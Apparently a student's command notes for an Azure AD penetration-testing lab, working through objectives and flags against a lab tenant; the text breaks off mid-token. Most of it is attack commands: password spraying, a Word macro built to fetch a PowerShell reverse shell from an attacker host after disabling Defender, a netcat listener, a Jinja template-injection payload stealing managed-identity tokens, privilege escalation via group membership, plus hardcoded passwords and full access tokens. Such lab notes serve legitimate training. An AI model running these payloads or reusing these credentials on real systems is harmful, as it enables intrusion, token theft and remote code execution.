## Learning Objective 1
# Enumerate and see where we are
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1 -Verbose
$User = "student170"
$domain = "defcorphq.onmicrosoft.com"
Get-AADIntLoginInformation -UserName $User
$tenant = Get-AADIntTenantId -Domain $domain
$tenant
## Learning Objective 2: Brute-force some users
# Get Tenant Domains
Get-AADIntTenantDomains -Domain $domain
# So we got not much here, so let's take a sample set of users and see if any of them are valid within the domain
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o validemails.txt
# That gave us 5 options! admin, test, root, dev, and contact. However, only two had emails: admin and test
# Run Microburst to see what types of services are being offered
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
$base = 'defcorphq'
Invoke-EnumerateAzureSubDomains -Base $base -Verbose
# Subdomain                             Service                
# defcorphq.mail.protection.outlook.com Email                  
# defcorphq.onmicrosoft.com             Microsoft Hosted Domain
# defcorphq.sharepoint.com              SharePoint             
# defcorphq-my.sharepoint.com           SharePoint 
            
# use MSOLSpray to do a password spray - This ONLY works because they gave us a password!
Import-Module C:\AzAD\Tools\MSOLSpray\MSOLSpray.ps1 
Invoke-MSOLSpray -UserList .\validemails.txt -Password 'SuperVeryEasytoGuessPAssw0rd!@222' -VErbose
# Winner, we found test@defcorphq.onmicrosoft.com has this password!

## Learning Objective 3
$user = "test@defcorphq.onmicrosoft.com"
$pass = 'SuperVeryEasytoGuessPAssw0rd!@222'
$creds = New-Object System.Management.Automation.PSCredential($user, $(ConvertTo-SecureString $pass -AsPlainText -Force))
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1
Connect-AzureAD -Credential $creds
# Let's see what the users are
Get-AzureADUser
# so we got a bunch of options, but no specifics on who is an Application Administrator
Get-AzureADDirectoryRole | ?{$_.DisplayName -contains "Application Administrator"}
$objectid = (Get-AzureADDirectoryRole | ?{$_.DisplayName -contains "Application Administrator"}).ObjectId
# So we can see the role, now who is a member?
Get-AzureADDirectoryRoleMember -ObjectId $objectid
#ObjectId                             DisplayName    UserPrincipalName                     UserType
#--------                             -----------    -----------------                     --------
#f66e133c-bd01-4b0b-b3b7-7cd949fd45f3 Mark D. Walden MarkDWalden@defcorphq.onmicrosoft.com Member  

## Learning Objective 4
Get-AzureADDirectoryRole | ?{$_.DisplayName -contains "Global Administrator"}
$objectid = (Get-AzureADDirectoryRole | ?{$_.DisplayName -contains "Global Administrator"}).ObjectId
Get-AzureADDirectoryRoleMember -ObjectId $objectid
# ObjectId                             DisplayName UserPrincipalName                                                           
# --------                             ----------- -----------------                                                           
# 1c077632-0e5b-40b3-a38c-516e4ab38d69 Monika      monika_alteredsecurity.com#EXT#_monikaalteredsecurity.FGYWB#EXT#@defcorph...
# 4d67b155-3494-46d0-a4cf-de359d8a9d68 admin       admin@defcorphq.onmicrosoft.com

## Learning Objective 5
Get-AzureADGroup
Get-AzureADMSRoleDefinition | ?{$_.isBuiltIn -eq $False}
# Answer is ApplicationProxyReader based on the Description

## Learning Objective 6
# now jump to AzPowershell to enumerate non-AzureAD stuff
Connect-AzAccount -Credential $creds
Get-AzVM
# test has access to bkpadconnect in the ENGINEERING resourcegroup at germanywestcentral

## flag 7
Get-AzWebApp | select HostNames
# returns vaultfrontend.azurewebsites.net and processfile.azurewebsites.net

## Flag 8
# Now jump over to AzCli to Enumerate details
az login -u $user -p $pass
az vm list
# Need to pull out the NetworkInterface
az vm list --query "[].networkProfile.networkInterfaces"
# id is: bkpadconnect368

## Flag 9
az webapp list --query "[].name"
az webapp list
# inside "identity" field shows "SystemAssigned"

## Flag 10
# Run ROADTools and gather the info
# you have to open a new shell and run this!
cd C:\AzAD\Tools\ROADTools
pipenv shell
$user = "test@defcorphq.onmicrosoft.com"
$pass = 'SuperVeryEasytoGuessPAssw0rd!@222'
roadrecon auth -u $user -p $pass 
roadrecon gather
roadrecon gui
# Now use your browswer and see your results
# Operations has "User" access to Finance in the "Application Roles"

## Flag 11
az webapp list --query "[].name"
# Not in there, looking for processfile app
az functionapp list --query "[].name"
az functionapp list
# Now let's run stormspotter and see that one run
cd C:\AzAD\Tools\stormspotter\backend
pipenv shell
python ssbackend.pyz
# start the front-end in a shell that is not an ISE
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa
quasar.cmd serve -p 9001 --history
# Collect the data
cd C:\AzAD\Tools\stormspotter\stormcollector\
pipenv shell
# login with your creds
az login -u $User -p $Pass
python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
# Now go to https://localhost:9001
# Reader is the permissions given to test user

## Flag 12
# They are looking for the Bloodhound filter, not the Stromspotter filter!
# MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p

## Flag 13
# User.ReadBasic.All is the other permissions that need to be added to the "API Permissions"

## Flag 14
# Start the Illicit-Grant Attack
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Start up 365Stealer and get it started
# Now we will go to those subdomains we found earlier and see if we can find some submit forms
# After finding one, we get a response from ErikmKeller
# That gives us back a list of user and time to go fishing. Let's fish for all users and see who responds
# We got a response from Mark!
# Let's create a rev shell in a word document and upload to his onedrive!
# You have to have a computer with office installed if you want to make an office macro exploit
$passwd = ConvertTo-SecureString "ForCreatingWordDocs@123" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("office-vm\administrator", $passwd)
$officeVM = New-PSSession -ComputerName 172.16.1.250 -Credential $creds
Enter-PSSession -Session $officeVM
Set-MpPreference -DisableRealtimeMonitoring $true
# Upload the Out-Word exploit to the office VM
IEX(New-Object Net.Webclient).downloadString("http://172.16.151.170:82/Out-Word.ps1")
Out-Word -Payload "powershell iex (new-object Net.webclient).downloadstring('http://172.16.151.170:82/Invoke-PowershellTcp.ps1');Power -Reverse -IPAddress 172.16.151.170 -Port 4444" -OutputFile student3.doc
exit
Copy-Item -FromSession $officeVM -Path C:\Users\Administrator\Documents\student3.doc -Destination C:\xampp\htdocs\student2.doc
# In a new terminal, start a listener
nc.exe -lvp 4444
# And we have a shell
hostname

## Flag 16
# go to defcorphqcareer.azurewebsites.net and upload your webshell
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM1ODc1MDIsIm5iZiI6MTY0MzU4NzUwMiwiZXhwIjoxNjQzNjc0MjAyLCJhaW8iOiJFMlpnWUVnM1ZkbWY2aHNwdi91UE1iZmY4L01DQUE9PSIsImFwcGlkIjoiMDY0YWFmNTctMzBhZi00MWYwLTg0MGEtMGUyMWVkMTQ5OTQ2IiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiY2M2N2M5MGQtZDllOS00MGQyLWI1MTEtOWQ1MmQ2NzY4MmFiIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRsZXZTZ2F2TVBCQmhBb09JZTBVbVVad0FBQS4iLCJzdWIiOiJjYzY3YzkwZC1kOWU5LTQwZDItYjUxMS05ZDUyZDY3NjgyYWIiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJadGxLOXJQT0hrS2RKcGpzZFVNSUFBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0VuZ2luZWVyaW5nL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL2RlZmNvcnBocWNhcmVlciIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.gFQMxSaef9Sw9DNz2BHgjTAjympREHhxAg8uhCVdN6619fBRF5bVVBicESmOJz3PxRjkj4QvuzzETP_qOtKU1BtwzMayoknA5G4P9ZdGsZGfwKkhi5JyFb4ujyLgbJdUZuI628zY5pypt_8-9Fmc6xlPMYMZifNhFWEgFsv6TTJ-S8BilnptUHVukN0wz2hXkNy0xydrrppN61nGmBwRaEVxMNby_YoNGE9DXZGW4tV68Ws6I00XfCdLKMnjcx1o4Qe2rWeFrtnTTg6N9S9z5uslHDWwz7nK2EZFy1XxpJrjja1VO-5rJ0l9DWPBF-8uwBA12m_o6bKCQaUg35zrQg'
$client_id = '064aaf57-30af-41f0-840a-0e21ed149946'
Connect-AzAccount -AccessToken $token -AccountId $client_id
Get-AzRoleAssignment
# if it returns an error, we have to do it manually
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $token"
   }
}
(Invoke-RestMethod @RequestParams).value
$subid = (Invoke-RestMethod @RequestParams).value.subscriptionId
$URI = "https://management.azure.com/subscriptions/$subid/resources?api-version=2020-10-01"
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $token"
   }
}
$results = (Invoke-RestMethod @RequestParams).value
$results | ForEach-Object{
    $input = $_.id
    $URI = "https://management.azure.com$input/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
    $RequestParams = @{
        Method = 'GET'
        Uri = $URI
        Headers = @{
            'Authorization' = "Bearer $token"
        }
    }
    (Invoke-RestMethod @RequestParams).value
}
# gives: Microsoft.Compute/virtualMachines/runCommand/action

## Flag 18
# Exploit the SSTI on the vaultfrontend to get the info
{{7 * 7 }}
{{config.items}}
# jinja

## Flag 19
#
{% for x in ().__class__.__mro__[1].__subclasses__() %}  {% if "Popen" in x.__name__ %}  {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=- 1).communicate()}}  {% endif %} {% endfor %}
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MzU4MDQ5OCwibmJmIjoxNjQzNTgwNDk4LCJleHAiOjE2NDM2NjcxOTgsImFpbyI6IkUyWmdZR2cxaUs3NEUzS0xPWlR0NkxkSzI0YUhBQT09IiwiYXBwaWQiOiIyZTkxYTRmZS1hMGYyLTQ2ZWUtODIxNC1mYTJmZjZhYTlhYmMiLCJhcHBpZGFjciI6IjIiLCJpZHAiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWR0eXAiOiJhcHAiLCJvaWQiOiIzMGU2NzcyNy1hOGI4LTQ4ZDktODMwMy1mMjQ2OWRmOTdjYjIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dHY2a2tTN3lvTzVHZ2hUNkxfYXFtcnh3QUFBLiIsInN1YiI6IjMwZTY3NzI3LWE4YjgtNDhkOS04MzAzLWYyNDY5ZGY5N2NiMiIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInV0aSI6Ik1jTGpoZVBmYzBHRWtSY0tpT29IQUEiLCJ2ZXIiOiIxLjAiLCJ4bXNfbWlyaWQiOiIvc3Vic2NyaXB0aW9ucy9iNDEzODI2Zi0xMDhkLTQwNDktOGMxMS1kNTJkNWQzODg3NjgvcmVzb3VyY2Vncm91cHMvUmVzZWFyY2gvcHJvdmlkZXJzL01pY3Jvc29mdC5XZWIvc2l0ZXMvdmF1bHRmcm9udGVuZCIsInhtc190Y2R0IjoiMTYxNTM3NTYyOSJ9.nOK9_xWHCaCt7oiq-JOARRzm-jaUHXncd2cqe5s5S2j3xFyPXDnFTR5cLdY4ch9sv39Z3qUFkk8oYKZBt2m_38O1beLZOZPURmpgQGKcAypnz83Faxi88Ghl9bSYowkvC6HN6gaqHK3Mw35hB4FgB-vBdfmy6yQaRrv0T5baI917ogSU3OrTL1uNAIk0Mq_izs7fXvjLpqd8D6VJOtu534qQJvuGS0ZstHpkshbKYDpHIaWCEmFtonP0xFNp2xMshx8eZxYpYFObK-E8eQa7nZk5NRTQLWdFXvx1L-J6XXENqzxs9RjjZVU1bFh6zrdepWFahiBVrdvxYcZY47GDhQ'
$client_id = '2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc'
Connect-AzAccount -AccessToken $token -AccountId $client_id
Get-AzContext -ListAvailable
Get-AzRoleAssignment
Get-AzResource
# have no idea what this question is asking for. User is not it

## Flag 20
# Compromise the scanner
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM1OTAyNDMsIm5iZiI6MTY0MzU5MDI0MywiZXhwIjoxNjQzNjc2OTQzLCJhaW8iOiJFMlpnWUhBdlVlT2Z2T3REKzE3aHBKVTdwNjViQWdBPSIsImFwcGlkIjoiNjJlNDQ0MjYtNWM0Ni00ZTNjLThhODktZjQ2MWQ1ZDU4NmYyIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlkdHlwIjoiYXBwIiwib2lkIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwicmgiOiIwLkFYQUFLY3RRTFh0ZnBFaUh6djUxcVVHdHRpWkU1R0pHWER4T2lvbjBZZFhWaHZKd0FBQS4iLCJzdWIiOiJlYTRjM2MxNy04YTVkLTRlMWYtOTU3Ny1iMjlkZmZmMDczMGMiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1dGkiOiJOQXJ1TF91T1MwaVFzd2JuQ3NrZ0FBIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvYjQxMzgyNmYtMTA4ZC00MDQ5LThjMTEtZDUyZDVkMzg4NzY4L3Jlc291cmNlZ3JvdXBzL0lUL3Byb3ZpZGVycy9NaWNyb3NvZnQuV2ViL3NpdGVzL3Byb2Nlc3NmaWxlIiwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.QcKlzfBy5GWrX_jg-Ic1rEDPdCuWgmCkSzdfUjCL23bVzjpIZ9pXQ4qFm2ZwsimtNrlbZ7Sm9J0TVQxB5UzCe3eTOMCns2NJszP_I-rtydrLdMvJtIUNJhMZZH0O_Xh-KpYYaNALyHl2-_BLR-E5u7LFx7hXJ_O4lbtbFnusMzMZnoFyXFopFMhI72ls7T_imlssNUzio1JpvHzgoTibTxJNYMYCn-XTvNOovT2xvKnWUCpkARsmYbsjjPLYR4Nssgo6cIawNDAyCMjMAgWD3Xk2qQUQpoP6V7bZeb09-AhbKshBnrLvXb4ArTrNyQO5Bhy1BQ4CFtQn_8vOUwNEjQ'
$client_id = '62e44426-5c46-4e3c-8a89-f461d5d586f2'
$graph_token = 'eyJ0eXAiOiJKV1QiLCJub25jZSI6InFKMmQ5SHZzNmd5azJBclp4bHRfR3ZlR3JKUUhydUd6LWVtcDZlYml0WnMiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTY0MzU5MDI0MywibmJmIjoxNjQzNTkwMjQzLCJleHAiOjE2NDM2NzY5NDMsImFpbyI6IkUyWmdZRWczVmRtZjZoc3B2L3VQTWJmZjgvTUNBQT09IiwiYXBwX2Rpc3BsYXluYW1lIjoicHJvY2Vzc2ZpbGUiLCJhcHBpZCI6IjYyZTQ0NDI2LTVjNDYtNGUzYy04YTg5LWY0NjFkNWQ1ODZmMiIsImFwcGlkYWNyIjoiMiIsImlkcCI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpZHR5cCI6ImFwcCIsIm9pZCI6ImVhNGMzYzE3LThhNWQtNGUxZi05NTc3LWIyOWRmZmYwNzMwYyIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0aVpFNUdKR1hEeE9pb24wWWRYVmh2SndBQUEuIiwic3ViIjoiZWE0YzNjMTctOGE1ZC00ZTFmLTk1NzctYjI5ZGZmZjA3MzBjIiwidGVuYW50X3JlZ2lvbl9zY29wZSI6IkFTIiwidGlkIjoiMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2IiwidXRpIjoiaWg1M0J0NjNXVUsyTzRKNFB2Rm5BQSIsInZlciI6IjEuMCIsIndpZHMiOlsiMDk5N2ExZDAtMGQxZC00YWNiLWI0MDgtZDVjYTczMTIxZTkwIl0sInhtc190Y2R0IjoxNjE1Mzc1NjI5fQ.sc58Brk_8XvZaEF6CwNmJ2ghCtm0dPZV0qlvZ-lHttKn_-5OtkAae9CQnXgUK1zpXAMotTEFxBgzCjJPEx1-RNM7Ep2MzvRaQCTrMog6TUFTGDJy1jMLNTH6CRGzi0HYWEYgZZSLKKJIzKfHpzU_n2yy4YZd7L0zfYp-741YhV26drKlfe2LGeAf1Tq_LXwDBk8UNi5E2llLpuWwnfATkJbrPF_kVVFZaQHaq9rgvHOkwZzwmHX-TEWaEzDggbB8uPMIsk5VvLjSPnZ-ZCydvJ8jAkXjmJvsfiwQg2HUIqR8zlJ4s6eYC_RScaHc68iy59hOtYTVswBJ7k0Z2DoRsQ'
Connect-AzAccount -AccessToken $token -GraphAccessToken $graph_token -AccountId $client_id
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
   Method = 'GET'
   Uri = $URI
   Headers = @{
    'Authorization' = "Bearer $graph_token"
   }
}
(Invoke-RestMethod @RequestParams).value
. C:\AzAD\Tools\Add-AzADAppSecret.ps1
Add-AzADAppSecret -GraphToken $graph_token -Verbose
# so "fileapp" is what can be added

## Flag 21
# 
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
$base = "defcorp"
Invoke-EnumerateAzureBlobs -Base $base
# defcorpcommon

## Flag 22
# backup...found with the last flag

## Flag 23
# This is from our shell we got before
az ad signed-in-user show
# says Mark is the user, need the group
az extension add --upgrade -n automation
az ad signed-in-user list-owned-objects
# There is a "Automation Admins". Pull out the objectId
# we need a graph token for this, so request one
az account get-access-token --resource-type aad-graph
$graph = '<token>'
# account id is needed, you need to find the account-id from the az ad signed-in-user show
$client_id = 'f66e133c-bd01-4b0b-b3b7-7cd949fd45f3'
# with these, you can go back to your shell and not the rev-shell!
$graph = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM1ODgxMzQsIm5iZiI6MTY0MzU4ODEzNCwiZXhwIjoxNjQzNTkzNzAyLCJhY3IiOiIxIiwiYWlvIjoiRTJaZ1lFaUlrY2g2My9rdXhMMDVZOUh2OW1jU3MzTk5WZXkxVGt3dlZsTmtlTmRTYmdNQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIwNGIwNzc5NS04ZGRiLTQ2MWEtYmJlZS0wMmY5ZTFiZjdiNDYiLCJhcHBpZGFjciI6IjAiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiTWFyayBELiBXYWxkZW4iLCJvaWQiOiJmNjZlMTMzYy1iZDAxLTRiMGItYjNiNy03Y2Q5NDlmZDQ1ZjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ0Q0U0QiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0cFYzc0FUYmpScEd1LTRDLWVHX2UwWndBQ2MuIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiWmoxUC0zY05mYzNXd3pJdTRRS1lBVVhzZnVmM3JCTElnajhfSEJXeEtybyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiTWFya0RXYWxkZW5AZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJaSmo0cmktR1BFV1F1YVRfdDU1ZUFBIiwidmVyIjoiMS4wIn0.SXHJ7Vcoz5vsOWMf8Bi1_qfmhejQuJfa_FlxssCJ8ZBy6y4SU09IzuUx90X9Y78Cg-LD9OruMccmGNnf5mdHCiYylwkNqjX4MBM6xkrY9D7MiPhhz4mI4LUyi-ejTdlnT6YTH0z5XD2461q_jjWoMBTDb2vhVRhfPP477Wo4z0Hb-N2fDingcixILxvztBgaTSfAaeLO7LX7IGztOquRuXW9r-Uz6j5ivPeu_Uq497MTmg2lLpbbUVg9Mbzc1LW7R5cm7omCZi7PeG_D_kEZYWsIfgCUBbczO_glqPFv3oK4k08j8IBOsYWlFuPYh3270IAKutVnpuUd6OyxblaEKg'
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
az account get-access-token --resource-type aad-graph

$graph = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNi8iLCJpYXQiOjE2NDM2NzU0MzQsIm5iZiI6MTY0MzY3NTQzNCwiZXhwIjoxNjQzNjgwMTI1LCJhY3IiOiIxIiwiYWlvIjoiRTJaZ1lOaWFzOS9JdDRkcldyRUdvNXYyUjY2Q3Zmb3ZPYnFVNy8vS09WMjcySEMraHhjQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIwNGIwNzc5NS04ZGRiLTQ2MWEtYmJlZS0wMmY5ZTFiZjdiNDYiLCJhcHBpZGFjciI6IjAiLCJpcGFkZHIiOiI1MS4yMTAuMS4yMzkiLCJuYW1lIjoiTWFyayBELiBXYWxkZW4iLCJvaWQiOiJmNjZlMTMzYy1iZDAxLTRiMGItYjNiNy03Y2Q5NDlmZDQ1ZjMiLCJwdWlkIjoiMTAwMzIwMDEyMEQ0Q0U0QiIsInJoIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0Z0lBQUFBQUFBQUF3QUFBQUFBQUFBQndBQ2MuIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiWmoxUC0zY05mYzNXd3pJdTRRS1lBVVhzZnVmM3JCTElnajhfSEJXeEtybyIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiTWFya0RXYWxkZW5AZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiIwWDlYXzJ6TWNVaVZ5TXFJem5RREFBIiwidmVyIjoiMS4wIn0.b-CMRYeo5WsBAY9reCN3xlQj0cAMVXz_kw_g-dYpkHuUxn76WqcsHMDWqAthKzhYfNgrC9QIpIU6dDqZ0KWti6GR2dDcobwpoNHIy8haRNhqx294wSy1iXTyTE3AlBHfaQ2hjCtNQSNXviW7Et3OloKvEZz8YaUUzX3Yww_zPkWbOY4HtlWE7LGdgfBF2c9lgZvC3I50I6FL5S_RUoMgKWNTvpGcOBk8d1E-Gz3dFBXGXgcbR9jrrmM-fEWZ6lgEBOLCzCfK71U9AenxdqXje_8Vjjb9US5TxIzlIc34TPC2ovedpGZdQiEjCQpWzlSoOsobOo5CusLUwtmfFJALdA'
$tenantId = '2d50cb29-5f7b-48a4-87ce-fe75a941adb6'
Connect-AzureAD -AadAccessToken $graph -TenantId $tenantId -AccountId $client_id
$automationAdminObjectId = 'e6870783-1378-4078-b242-84c08c6dc0d7'
# Now let's add the user we have in the shell to the Automation admins Group
Add-AzureADGroupMember -ObjectId $automationAdminObjectId -RefObjectId $client_id
# Jump back to the rev-shell and pull the id
az automation account list
# grab an access token
az account get-access-token
# Now back to my shell 
$token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCIsImtpZCI6Ik1yNS1BVWliZkJpaTdOZDFqQmViYXhib1hXMCJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8yZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYvIiwiaWF0IjoxNjQzNjc5MDMyLCJuYmYiOjE2NDM2NzkwMzIsImV4cCI6MTY0MzY4MzA4NSwiYWNyIjoiMSIsImFpbyI6IkFTUUEyLzhUQUFBQWlYb2RzYktyMTlDcTJHcHJFY2dtYk41N3RKSHpjd2ZHOXhlNTJWZWlFaGM9IiwiYW1yIjpbInB3ZCJdLCJhcHBpZCI6IjA0YjA3Nzk1LThkZGItNDYxYS1iYmVlLTAyZjllMWJmN2I0NiIsImFwcGlkYWNyIjoiMCIsImdyb3VwcyI6WyIwY2U3ZDQzMi05NGVhLTQ0OGMtYTE0OS00YTU2Mzk2MzU2YmIiLCJlNjg3MDc4My0xMzc4LTQwNzgtYjI0Mi04NGMwOGM2ZGMwZDciXSwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6Ik1hcmsgRC4gV2FsZGVuIiwib2lkIjoiZjY2ZTEzM2MtYmQwMS00YjBiLWIzYjctN2NkOTQ5ZmQ0NWYzIiwicHVpZCI6IjEwMDMyMDAxMjBENENFNEIiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dGtaSWYza0F1dGRQdWtQYXdmajJNQk53QUNjLiIsInNjcCI6InVzZXJfaW1wZXJzb25hdGlvbiIsInN1YiI6ImFqV2FQY0tCTFF2aE5NWDFkTHBLR3ZfeXFHUzRxekNGQXptUEJjZXVaelUiLCJ0aWQiOiIyZDUwY2IyOS01ZjdiLTQ4YTQtODdjZS1mZTc1YTk0MWFkYjYiLCJ1bmlxdWVfbmFtZSI6Ik1hcmtEV2FsZGVuQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJNYXJrRFdhbGRlbkBkZWZjb3JwaHEub25taWNyb3NvZnQuY29tIiwidXRpIjoicW5LQWx4c0xmMENlTko5SmtMZ0dBQSIsInZlciI6IjEuMCIsIndpZHMiOlsiOWI4OTVkOTItMmNkMy00NGM3LTlkMDItYTZhYzJkNWVhNWMzIiwiYjc5ZmJmNGQtM2VmOS00Njg5LTgxNDMtNzZiMTk0